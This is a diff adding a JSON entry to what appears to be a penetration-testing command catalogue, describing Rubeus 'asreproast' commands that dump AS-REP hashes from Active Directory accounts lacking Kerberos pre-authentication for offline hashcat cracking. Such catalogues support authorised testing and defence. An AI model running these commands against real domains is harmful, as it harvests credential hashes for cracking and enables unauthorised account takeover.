@@ -1,0 +1,20 @@
+{
+  "id": "rubeus-asreproast",
+  "name": "Rubeus asreproast",
+  "command": "Rubeus.exe asreproast /outfile:asrep.txt",
+  "description": "Find every account with DONT_REQ_PREAUTH set and dump AS-REP hashes for offline cracking (hashcat 18200). Runs from a domain-joined Windows host with no special privileges.",
+  "platform": "windows",
+  "requires": ["shell"],
+  "protocols": ["kerberos", "ldap"],
+  "tags": ["rubeus", "asreproast", "pre-auth"],
+  "variations": [
+    { "label": "Specific User", "requires": "shell", "command": "Rubeus.exe asreproast /user:<target-user> /outfile:asrep.txt" },
+    { "label": "Hashcat Format", "requires": "shell", "command": "Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt" }
+  ],
+  "references": [
+    { "title": "Rubeus", "url": "https://github.com/GhostPack/Rubeus" }
+  ],
+  "examples": [
+    "Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt"
+  ]
+}
